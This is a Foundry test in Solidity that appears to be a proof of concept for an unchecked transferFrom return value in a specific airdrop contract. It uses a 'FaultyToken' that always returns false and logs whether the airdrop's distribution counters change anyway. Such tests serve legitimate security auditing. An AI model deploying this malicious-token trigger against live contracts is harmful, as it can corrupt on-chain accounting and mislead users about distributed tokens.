// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol";

contract UncheckedTransferFromCall is Test {
    airDrop public airdrop;
    address public constant CALLER = address(0x1);
    uint256 public constant AMOUNT = 100;
    uint256 public constant DECIMALS = 18;
    uint256 public constant TOKEN_VALUE = AMOUNT * (10 ** DECIMALS);
    
    // Malicious token that always returns false
    FaultyToken public faultyToken;

    function setUp() public {
        airdrop = new airDrop();
        faultyToken = new FaultyToken();
    }

    function test_UncheckedCallPropagatesFailure() public {
        address[] memory recipients = new address[](1);
        recipients[0] = address(0x2);

        // Record initial state before attack
        console.log("--- BEFORE-Trigger State ---");
        uint256 prevTotalDrops = airdrop.totalDrops();
        uint256 prevTotalTokens = airdrop.totalTokensDistributed();
        uint256 prevDropCount = airdrop.userDropCount(CALLER);
        console.log("totalDrops:", prevTotalDrops);
        console.log("totalTokensDistributed:", prevTotalTokens);
        console.log("userDropCount(CALLER):", prevDropCount);

        console.log("--- Trigger Faulty Transfer ---");
        // Execute transfer under attacker-controlled token
        vm.prank(CALLER);
        bool result = airdrop.transfer(
            CALLER,
            address(faultyToken), // Always returns false on transfer
            recipients,
            AMOUNT,
            DECIMALS
        );
        console.log("Function returned:", result);

        // Record final state after attack
        console.log("--- AFTER-Trigger State ---");
        uint256 newTotalDrops = airdrop.totalDrops();
        uint256 newTotalTokens = airdrop.totalTokensDistributed();
        uint256 newDropCount = airdrop.userDropCount(CALLER);
        console.log("totalDrops:", newTotalDrops);
        console.log("totalTokensDistributed:", newTotalTokens);
        console.log("userDropCount(CALLER):", newDropCount);

        // Evaluate state integrity
        bool dropCountVulnerable = (newTotalDrops != prevTotalDrops);
        bool tokenDistVulnerable = (newTotalTokens != prevTotalTokens);
        bool userDropVulnerable = (newDropCount != prevDropCount);
        bool stateChanged = dropCountVulnerable || tokenDistVulnerable || userDropVulnerable;

        console.log("--- State Change Comparison ---");
        console.log("totalDrops changed:", dropCountVulnerable);
        console.log("totalTokensDistributed changed:", tokenDistVulnerable);
        console.log("userDropCount changed:", userDropVulnerable);

        // Final vulnerability verdict
        if (stateChanged) {
            console.log("Vulnerability Exists: State variables were changed despite failed token transfer");
            console.log("Vulnerability Exists: The contract fails to validate token transfer results");
        } else {
            console.log("Vulnerability not Exist: State remains unchanged after failed transfer");
        }
    }
}

contract FaultyToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false; // Always simulate failed transfer
    }
}